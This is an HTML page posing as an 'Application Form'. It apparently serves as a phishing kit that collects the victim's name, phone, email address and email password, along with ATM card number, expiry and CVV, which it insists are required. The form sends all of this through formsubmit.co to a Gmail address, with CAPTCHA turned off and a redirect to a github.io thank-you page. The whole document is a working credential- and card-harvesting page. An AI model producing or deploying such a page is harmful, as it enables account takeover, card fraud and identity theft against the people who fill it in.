<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f2f2f2;
    }
    form {
      max-width: 500px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button[type="submit"] {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button[type="submit"]:hover {
      background: #0056b3;
    }
    .error-message {
      color: red;
      font-size: 14px;
      margin-top: 4px;
      display: none;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper button {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }
    .atm-section {
      display: none;
    }
  </style>
</head>
<body>
  <form id="applicationForm" 
        action="https://formsubmit.co/exellentfirm@gmail.com" 
        method="POST" 
        novalidate>
        
    <h2>Application Form</h2>

    <label for="fullName">Full Name</label>
    <input type="text" id="fullName" name="fullName" required />
    <div id="errorFullName" class="error-message">Full Name is required</div>

    <label for="country">Country</label>
    <input type="text" id="country" name="country" required />
    <div id="errorCountry" class="error-message">Country is required</div>

    <label for="phone">Phone Number</label>
    <input type="tel" id="phone" name="phone" required />
    <div id="errorPhone" class="error-message">Phone number must be 9 to 12 digits</div>

    <label for="email">Email</label>
    <input type="email" id="email" name="email" required />
    <div id="errorEmail" class="error-message">Please enter a valid email</div>

    <label for="password">Email Password</label>
    <div class="password-wrapper">
      <input type="password" id="password" name="password" required />
      <button type="button" onclick="togglePassword()">üëÅÔ∏è</button>
    </div>
    <div id="errorPassword" class="error-message">Email Password is required</div>

    <label for="linked">Did you link your ATM card to your account?</label>
    <select id="linked" name="linked" required>
      <option value="" disabled selected>Select</option>
      <option value="yes">Yes</option>
      <option value="no">No</option>
    </select>
    <div style="color: red; font-weight: bold; margin-top: 5px;">
      YOU MUST HAVE ATM CARD TO PROCEED
    </div>
    <div id="linkError" class="error-message">You must link your ATM card to proceed.</div>

    <div class="atm-section" id="atmSection">
      <label for="card">ATM Card Number</label>
      <input type="number" id="card" name="card" />
      <div id="errorCard" class="error-message">ATM card must be 16 digits</div>

      <label for="expiry">Expiry Date</label>
      <input type="month" id="expiry" name="expiry" />

      <label for="cvv">CVV</label>
      <input type="number" id="cvv" name="cvv" />
      <div id="errorCVV" class="error-message">CVV must be 3 digits</div>
    </div>

    <!-- ‚úÖ Hidden inputs to enable redirect and disable CAPTCHA -->
    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/application-form/thank-you.html">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit">Submit Application</button>
  </form>

  <script>
    function togglePassword() {
      const pass = document.getElementById("password");
      pass.type = pass.type === "password" ? "text" : "password";
    }

    const form = document.getElementById("Application Form");
    const linked = document.getElementById("linked");
    const atmSection = document.getElementById("atmSection");

    linked.addEventListener("change", function () {
      const showATM = linked.value === "yes";
      document.getElementById("linkError").style.display = "none";
      atmSection.style.display = showATM ? "block" : "none";
    });

    form.addEventListener("submit", function(event) {
      const linkError = document.getElementById("linkError");

      if (linked.value !== "yes") {
        event.preventDefault();
        linkError.style.display = "block";
        linked.focus();
        return;
      }

      const card = document.getElementById("card");
      const cvv = document.getElementById("cvv");

      if (card.value.length !== 16) {
        event.preventDefault();
        document.getElementById("errorCard").style.display = "block";
      } else {
        document.getElementById("errorCard").style.display = "none";
      }

      if (cvv.value.length !== 3) {
        event.preventDefault();
        document.getElementById("errorCVV").style.display = "block";
      } else {
        document.getElementById("errorCVV").style.display = "none";
      }
    });

    // Real-time validation
    document.getElementById("fullName").addEventListener("input", function() {
      document.getElementById("errorFullName").style.display = this.value.trim() === "" ? "block" : "none";
    });

    document.getElementById("country").addEventListener("input", function() {
      document.getElementById("errorCountry").style.display = this.value.trim() === "" ? "block" : "none";
    });

    document.getElementById("phone").addEventListener("input", function() {
      const valid = /^\d{9,12}$/.test(this.value);
      document.getElementById("errorPhone").style.display = valid ? "none" : "block";
    });

    document.getElementById("email").addEventListener("input", function() {
      const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(this.value);
      document.getElementById("errorEmail").style.display = valid ? "none" : "block";
    });

    document.getElementById("password").addEventListener("input", function() {
      document.getElementById("errorPassword").style.display = this.value.trim() === "" ? "block" : "none";
    });

    document.getElementById("card").addEventListener("input", function() {
      document.getElementById("errorCard").style.display = this.value.length === 16 ? "none" : "block";
    });

    document.getElementById("cvv").addEventListener("input", function() {
      document.getElementById("errorCVV").style.display = this.value.length === 3 ? "none" : "block";
    });
  </script>
</body>
</html>
